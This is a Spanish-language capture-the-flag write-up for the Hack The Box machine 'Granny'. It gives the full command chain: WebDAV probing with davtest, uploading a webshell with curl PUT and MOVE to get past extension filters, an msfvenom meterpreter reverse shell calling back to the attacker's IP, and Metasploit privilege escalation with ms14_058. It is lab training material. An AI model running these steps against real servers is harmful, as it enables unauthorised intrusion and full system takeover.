@@ -1,0 +1,73 @@
+Maquina: Windows
+Level: Easy
+IP: 10.10.10.15
+
+Herramientas a utilizar:
+
+- nmap
+- davtest
+- curl
+- msfvenom
+- msfconsole = metaexploit
+
+Utilizaremos davtest esta herramienta nos permitirar saber que tipo de archivo se pueden cargar y si podemos
+crear un directorio en la web.
+
+davtest -url http://10.10.10.15
+
+Vemos que tenemos la faculta de subir multiplex tipo de archivo. de lo cual procederemos a probar uno de ellos
+
+Creamos un archivo prueba.txt y que contenga la palabra r0ok1e
+# echo r0ok1e > prueba.txt 
+Ahora cargaremos el archivo a la web Granny
+# curl -X PUT http://10.10.10.15/test1.txt -d @prueba.txt
+# curl http://10.10.10.15/test1.txt esto debe traer la plabra r0ok1e
+
+Como ya sabemos que podemos subir archivo, ahora intentaremos subir un webshell, en nuestro kali tenemos algunas
+
+# cp /usr/share/webshells/aspx/cmdasp.aspx .
+
+Con esto tendremos cmdasp.aspx esta es nuestra webshell que debemos subir.
+
+# curl -X PUT http://10.10.10.15/r0ok1e.txt -d @cmdasp.aspx
+
+Probamos con: http://10.10.10.15/r0ok1e.txt y vemos que funciono, ahora debemos hacer lo siguiente
+
+curl -X MOVE -H 'Destination:http://10.10.10.15/r0ok1e.aspx' http://10.10.10.15/r0ok1e.txt
+
+Probamos otra vez: http://10.10.10.15/r0ok1e.aspx y ya tenemos nuestra web shell
+
+pero no tenemos ejecucion de comando para esto utilizaremos metaexploit
+
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > rshell.aspx
+
+# msconsole
+# use exploit/multi/handler
+# set payload windows/meterpreter/reverse_tcp
+# set LHOST 10.10.14.14
+# set LPORT 443
+# run
+
+En otra terminal haremos lo siguiente:
+
+# curl -X PUT http://10.10.10.15/rshell.txt --data-binary @rshell.aspx
+# curl -X MOVE -H 'Destination: http://10.10.10.15/rshell.aspx' http://10.10.10.15/rshell.txt
+# curl http://10.10.10.15/rshell.aspx
+
+volvemos a nuestro metaexploit y debemos tener shell
+para confirmar hagamos ejecutamos 
+# background
+y nos indicara cuanta session tenemos.
+
+# search local_exploit
+# use 0
+# set session 1
+# run
+# use exploit windows/local/ms14_058_track_popup_menu
+# set lhost 10.10.14.14
+# set session 1
+# run
+
+Listo ya tenemos shell y solo seria ir al Desktop de: 
+cd c:\Documents and Settings\Administrator\Desktop
+cd c:\Documents and Settings\Lakis\Desktop
